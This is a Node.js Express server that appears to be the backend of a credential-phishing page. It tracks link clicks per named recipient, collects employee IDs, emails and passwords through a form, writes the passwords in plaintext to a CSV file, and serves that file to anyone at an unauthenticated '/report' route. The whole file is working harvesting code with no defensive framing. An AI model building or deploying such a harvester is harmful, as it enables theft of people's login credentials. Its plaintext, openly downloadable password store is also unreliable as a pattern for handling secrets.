const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();

let queue = [];
let isProcessing = false;

app.use('/static', express.static('static'));
app.use(express.urlencoded({ extended: true }));
app.set('view engine', 'ejs');

// CSV file (UTF-8 BOM)
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir);

const dataFile = path.join(dataDir, 'data.csv');
if (!fs.existsSync(dataFile)) {
    fs.writeFileSync(dataFile, '\ufeffEmployeeID,Name,Email,Password,Timestamp\n', 'utf8');
}

// GET /?name=xxx
app.get('/', (req, res) => {
    const { name } = req.query;
    if (name) {
        const timestamp = new Date().toISOString();
        const safeName = `"${name.replace(/"/g,'""')}"`;
        const csvLine = `"","","","${safeName} (link visit)","${timestamp}"\n`;
        queue.push(csvLine);
        if (!isProcessing) processQueue();
    }
    res.render('form', { name: name || '' });
});

// POST /submit
app.post('/submit', (req, res) => {
    const { empid, email, password, name: formName } = req.body;
    if (!empid || !email || !password) return res.status(400).send('Missing parameters');

    const name = formName || email.split('@')[0];

    const safeEmpid = `"${empid.replace(/"/g,'""')}"`;
    const safeName = `"${name.replace(/"/g,'""')}"`;
    const safeEmail = `"${email.replace(/"/g,'""')}"`;
    const safePassword = `"${password.replace(/"/g,'""')}"`;
    const timestamp = `"${new Date().toISOString()}"`;

    const csvLine = `${safeEmpid},${safeName},${safeEmail},${safePassword},${timestamp}\n`;
    queue.push(csvLine);
    if (!isProcessing) processQueue();

    res.render('success', { empid });
});

// GET /report → download CSV
app.get('/report', (req, res) => {
    if (!fs.existsSync(dataFile)) return res.status(404).send('CSV file not found.');
    res.download(dataFile, 'report.csv');
});

// Queue processor
async function processQueue() {
    isProcessing = true;
    while (queue.length > 0) {
        const data = queue.shift();
        try { await writeFileAsync(data); }
        catch (err) { console.error('Error writing CSV:', err); }
    }
    isProcessing = false;
}

function writeFileAsync(data) {
    return new Promise((resolve, reject) => {
        fs.appendFile(dataFile, data, { encoding: 'utf8' }, (err) => {
            if (err) return reject(err);
            resolve();
        });
    });
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});
